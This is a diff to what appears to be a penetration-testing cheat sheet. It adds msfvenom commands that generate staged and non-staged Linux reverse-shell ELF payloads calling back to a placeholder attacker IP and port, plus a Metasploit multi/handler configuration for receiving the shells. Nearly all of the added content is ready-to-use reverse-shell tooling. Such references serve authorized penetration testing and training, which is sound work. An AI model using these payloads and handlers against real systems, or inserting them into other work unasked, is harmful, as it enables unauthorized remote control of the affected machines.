@@ -376,6 +376,35 @@ For all shellcode see ‘msfvenom –help-formats’ for information as to valid
 	
 	msfvenom -p osx/x86/shell_reverse_tcp LHOST=<[IP]> LPORT=<[PORT]> -f <[LANGUAGE]>
 
+# Staged vs Non-Staged Payloads
+
+<b>Staged payload:</b> (useful for bof) (need multi_handler metasploit in order to works)
+
+	Windows/shell/reverse_tcp
+	
+	msfvenom -a x86 -p linux/x86/shell/reverse_tcp LHOST=<[IP]> LPORT=<[PORT]> -b "\x00" -f elf -o <[FILE_NAME_STAGED]>
+
+<b>Non-staged:</b> (ok with netcat listener)
+
+	Windows/shell_reverse_tcp
+	
+	msfvenom -a x86 -p linux/x86/shell_reverse_tcp LHOST=<[IP]> LPORT=<[PORT]> -b "\x00" -f elf -o <[FILE_NAME_NON_STAGED]>
+
+# Handlers
+
+Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.
+
+	use exploit/multi/handler
+	
+	set PAYLOAD <[PAYLOAD_NAME]>
+	
+	set LHOST <[IP]>
+	
+	set LPORT <[PORT]>
+	
+	set ExitOnSession false
+	
+	exploit -j -z
 
 
 
